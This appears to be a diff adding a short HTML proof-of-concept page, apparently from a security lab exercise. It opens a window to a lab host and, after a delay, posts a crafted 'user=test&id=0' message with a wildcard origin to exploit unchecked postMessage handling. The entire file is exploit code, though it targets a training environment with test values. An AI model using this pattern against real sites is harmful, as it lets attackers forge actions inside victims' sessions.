@@ -1,0 +1,12 @@
+<html>
+<head>
+    <title>PoC</title>
+    <script>
+    document.w = window.open("http://ptl-1666caf4-f0d4fff9.libcurl.so/","hack");
+    setTimeout(function() {
+        document.w.window.postMessage('user=test&id=0',"*");
+    }, 4000);
+    </script>
+</head>
+<body>
+</body>
